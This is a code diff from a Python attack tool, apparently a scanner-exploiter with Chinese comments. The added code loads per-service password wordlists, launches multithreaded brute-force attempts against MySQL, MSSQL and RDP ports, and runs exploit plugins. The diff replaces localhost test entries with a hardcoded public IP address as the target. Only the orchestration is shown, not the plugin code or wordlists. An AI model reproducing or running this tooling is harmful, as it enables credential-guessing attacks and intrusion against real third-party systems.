@@ -61,40 +61,6 @@ class Cidr:
                 cidrlist.append(self.bin2ip(ipPrefix + self.dec2bin(i, (32 - subnet))))
             return cidrlist
 
-def IptoNum(Host):
-    splitHostList = [int(hostIp) for hostIp in Host.split('.')]             #splitHostList为IP分割后的IP列表
-    HostNum = sum([splitHostList[i] << [24,16,8,0][i] for i in range(4)])   #HostNum位IP转为为10进制后的结果
-    return HostNum
-
-def NumtoIp(HostNum):
-    HostIp = '.'.join([str(HostNum >> j & 0xff) for j in [24,16,8,0]])      # &按位与
-    return HostIp
-
-# 解析IP
-def hostParse():
-    Host = get_value('Host')
-    logger = get_value('logger')
-    q_ip = getQueue()  # 存放IP队列
-
-    ip_list = []
-    if Host.count(r'/') == 1:
-        ip_list = Cidr(Host).listCIDR()
-
-    elif '-' in Host:
-        ip_start, ip_end = Host.split('-')[0], Host.split('-')[1]
-        for ip_num in range(IptoNum(ip_start), IptoNum(ip_end) + 1):
-            ip = NumtoIp(ip_num)
-            ip_list.append(ip)
-    else:
-        ip_list.append(Host)
-
-    logger.info('[Len{}] {}'.format(len(ip_list), ip_list))
-    # 存入队列
-    for ip in ip_list:
-        q_ip.put(ip)
-
-    set_value('q_ip', q_ip)
-
 def filesParse():
     filesPath = get_value('filesPath')
     q_ip = getQueue()
@@ -111,8 +77,7 @@ def getQueue():
     return q
 
 # 复制队列
-def copyQueue():
-    q = get_value('q_ip')
+def copyQueue(q):
     from queue import Queue
     q2 = Queue(-1)
     L = []
@@ -162,25 +127,58 @@ def checkBrustService(__service):
     return None
 
 # 打开密码本，将密码存入全局变量里
-def setGloPwdContent(pwdTxtName):
-    if not exist_key(pwdTxtName):
-        pwdContent = []
-        with open('PwdTxt/{}'.format(pwdTxtName), 'rt') as f:
+def setGloPwdContent(pwdTXT):
+    if not exist_key(pwdTXT):          # 如果密码本已经读取过一次内容就不再读取
+        pwdContent = getQueue()         # 存放字典的队列
+        with open('password/{}'.format(pwdTXT), 'rt') as f:
             for each in f.readlines():
-                pwdContent.append(each.strip())
-        set_value(pwdTxtName, pwdContent)
+                pwdContent.put(each.strip())
+        set_value(pwdTXT, pwdContent)          # {'mysql.txt': ['111', '111', '1111']}
     else:
         pass
         # logger.info('全局变量已经存在{}'.format(pwdTxtName))
 
 
+# 多线程爆破端口
+def burstPortThread(Exp, ip, port, pwdTXT):
+    threadNum = get_value('threadNum')
+    q_pwd = get_value(pwdTXT)
+    q_pwdCopy = copyQueue(q_pwd)            # 赋值密码队列
+    threads = []
+    for num in range(1, threadNum + 1):
+        t = Exp(ip, port, q_pwdCopy)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
 
 def attackMultiThread():
+    from Libs.plugins import pluginInit
     # nmapResult = get_value('nmapResult')
-    nmapResult = [{'127.0.0.1': {'mysql': 3306, 'http': 443}}, {'127.0.0.2': {'mysql': 3306, 'http': 443}}]
-    for each in nmapResult:
-        for ip in each:
+    getcwd = get_value('getcwd')
+    #print(nmapResult)
+    # nmapResult = [{'127.0.0.1': {'3306': 'mysql', '80': 'http', '443': 'http'}}, {'127.0.0.2': {'3306': 'mysql', '80': 'http', '443': 'http'}}]
+    nmapResult = [{'103.78.141.122': {'80': 'http', '1433': 'ms-sql-s', '3389': 'ms-wbt-server'}}]       # , '3389': 'ms-wbt-server'
+    for each_ip in nmapResult:
+        for ip in each_ip:
             ip = ip
-            service = each[ip].keys()
-            for _ in service:
-                print(ip, _, each[ip][_])
+            ports = each_ip[ip].keys()
+            for port in ports:
+                service = each_ip[ip][port]
+                init = pluginInit(service)          # 初始化插件文件, 添加环境变量
+                plugins = init.plugins              # 获取插件
+                pwdTXT = service + '.txt'           # mysql.txt   mssql.txt
+                if init.pwdExist(pwdTXT):           # 如果password目录有该密码本，返回True，否则返回None.
+                    setGloPwdContent(pwdTXT)        # 读取密码内容存到全局变量里
+                    # logger.info(get_value(pwdTXT))
+                if plugins:
+                    for plugin in plugins:              # 遍历插件
+                        if init.pluginExist(plugin):
+                            md = init.launch(plugin)
+                            if hasattr(md, 'Exploit'):
+                                Exp = getattr(md, 'Exploit')
+                                if 'brust' in plugin:           # 爆破
+                                    burstPortThread(Exp, ip, int(port), pwdTXT)
+                                else:                           # 调用插件
+                                    Exp(ip, int(port)).launch()
